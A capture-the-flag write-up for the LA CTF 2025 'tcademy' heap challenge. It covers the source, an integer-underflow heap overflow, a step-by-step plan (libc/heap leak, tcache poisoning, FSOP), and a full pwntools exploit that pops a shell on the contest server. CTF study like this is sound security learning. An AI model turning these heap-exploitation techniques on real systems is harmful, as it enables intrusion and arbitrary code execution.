# Write up LA CTF 2025
## PWN
### tcademy
#### overview
```shell
pwndbg> checksec
File:     /home/thefless/Documents/LACTF/tcademy/chall_patched
Arch:     amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'.'
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
pwndbg> 
```
```c
int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    int choice;
    while (1) {
        menu();
        scanf("%d", &choice);
        switch (choice) {
            case 1:
                create_note();
                break;
            case 2:
                delete_note();
                break;
            case 3:
                print_note();
                break;
            case 4:
                puts("goodbye!");
                exit(0);
            default:
                puts("Invalid option");
                exit(1);
        };
    }
}
```
- init something and do the choice.
```c
void create_note() {
    int index = get_note_index();
    unsigned short size;
    if (notes[index] != NULL) {
        puts("Already allocated! Free the note first");
        return;
    }

    printf("Size: ");
    scanf("%hu", &size);
    if (size < 0 || size > 0xf8) {
        puts("Invalid size!!!");
        exit(1);
    }

    notes[index] = malloc(size);
    printf("Data: ");
    read_data_into_note(index, notes[index], size); 
    puts("Note created!");
}
```
- malloc chunk size [0 , 0xf8].
- call `read_data_into_note`.
```c
int read_data_into_note(int index, char *note, unsigned short size) {
    // I prevented all off-by-one's by forcing the size to be at least 7 less than what was declared by the user! I am so smart
    unsigned short resized_size = size == 8 ? (unsigned short)(size - 7) : (unsigned short)(size - 8);
    int bytes = read(0, note, resized_size);
    if (bytes < 0) {
        puts("Read error");
        exit(1);
    }
    if (note[bytes-1] == '\n') note[bytes-1] = '\x00';
}
```
- control integer bug in `resize_size`. For example: size = 0, resize_size = size - 8 = 65528 (unsigned short). That make heap overflow.
```c
void delete_note() {
    int index = get_note_index();
    free(notes[index]);
    notes[index] = 0;
    puts("Note deleted!");
}
void print_note() {
    int index = get_note_index();
    puts(notes[index]);
}
```
- no bug in `delete_note` and `print_note`.
#### exploit
- I created a chunk_attack to overflow the next chunk in memory.
- I free chunk_attack into tcache.
- I allocated multiple chunks of varying sizes, aiming for the maximum allowable size for each.
- I reallocated chunk_attack and used the overflow to overwrite the size field of the adjacent chunk. I set the size to be large enough so that, when freed, it would bypass the tcache and fall into the unsorted bin.
- I free chunk_attack into tcache again.
- I free chunk in below of chunk_attack.
- I malloc it again to get libc base.
- I cycled (free & malloc) chunk_attack to overflow into the adjacent chunk. Subsequently, I cycled the adjacent chunk itself to trigger the tcache poisoning attack.
- I use FSOP attack.
#### Proof of Concepts
```python
#!/usr/bin/python3
from pwn import *


# Edit these placeholders: ./chall_patched ./libc.so.6 amd64
context.binary = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")
context.arch = "amd64"


script = '''
set debuginfod enable on
b*main+149
b*exit
b*_IO_flush_all
c
'''
# p = gdb.debug(exe.path , gdbscript = script)
p = remote("chall.lac.tf" , port = 31144)


def slog(name , addr): return success(": ".join([name , hex(addr)]))
def s(payload):
    sleep(1.5)
    p.send(payload)
def sl(payload):
    sleep(1.5)
    p.sendline(payload)
def sa(info , payload):
    p.sendafter(info , payload)
def sla(info , payload):
    p.sendlineafter(info , payload)
def ru(payload):
    return p.recvuntil(payload)
def rn(payload):
    return p.recvn(payload)
def rln():
    return p.recvline()


def create(idx , size , data):
    sla(b'Choice > ' , b'1')
    sla(b'Index: ' , f'{idx}'.encode())
    sla(b'Size: ' , f'{size}'.encode())
    sa(b'Data: ' , data)
def delete(idx):
    sla(b'Choice > ' , b'2')
    sla(b'Index: ' , f'{idx}'.encode())
def print(idx):
    sla(b'Choice > ' , b'3')
    sla(b'Index: ' , f'{idx}'.encode())

create(0 , 0 , b'A')
delete(0)
create(0 , 0xf8 , b'A' * 0x8)
create(1 , 0xf8 , b'B' * 0x8)
delete(1)
delete(0)

create(0 , 0xf8 - 0x10 , b'B' * 0x8)
create(1 , 0xf8 - 0x10 , b'B' * 0x8)
delete(0)
delete(1)
create(0 , 0xf8 - 0x20 , b'B' * 0x8)
create(1 , 0xf8 - 0x20 , b'B' * 0x8)
delete(0)
delete(1)
create(0 , 0xf8 - 0x30 , b'B' * 0x8)
create(1 , 0xf8 - 0x30 , b'B' * 0x8)
delete(0)
delete(1)
create(1 , 0xf8 , b'B' * 0x8)

create(0 , 0 , flat({
    0x18:[0x671]
} , filler = b'\x00'))
delete(0)
delete(1)
create(1 , 0xf8 - 0x40 , b'\xe0')
print(1)
libc.address = u64(rn(6) + b'\x00' * 2) - 0x21b1e0
slog("libc base" , libc.address)
slog("system" , libc.sym.system)
delete(1)
create(1 , 0xf8 - 0x40 , b'A' * 0x10)
print(1)
ru(b'A' * 0x10)
heap = u64(rn(6) + b'\x00' * 2) - 0x2b0
slog("heap base" , heap)
poison_chunk = heap + 0x2c0
create(0 , 0 , flat({
    0x18:[0x101]
} , filler = b'\x00'))
delete(0)
delete(1)

create(0 , 0 , flat({
    0x18:[0x101 , (poison_chunk >> 12) ^ (libc.sym._IO_2_1_stderr_ - 0x10)]
} , filler = b'\x00'))
delete(0)
fp = FileStructure()
fp.flags = u32("  sh")
fp.vtable = libc.sym._IO_wfile_jumps
fp._wide_data = heap + 0x2c0
fp._IO_read_ptr = 0
fp._IO_read_end = 0
fp._IO_read_base = 0
fp._IO_write_ptr = 1
fp._IO_write_end = 0
fp._IO_write_base = 0
fp._IO_buf_end = 0
fp._IO_buf_base = 0
fp._lock = libc.address + 0x205710

create(1 , 0xf8 , b'A' * 0x10)
create(0 , 0xf8 , flat({
    0x10:[
        bytes(fp)
    ]
} , filler = b'\x00'))
delete(1)
create(1 , 0xf8 , flat({
    0x68:[libc.sym.system],
    0xe0:[heap + 0x2c0],

} , filler = b'\x00'))
sla(b'Choice > ' , b'4')
sl("cat flag.txt")
p.interactive()
```
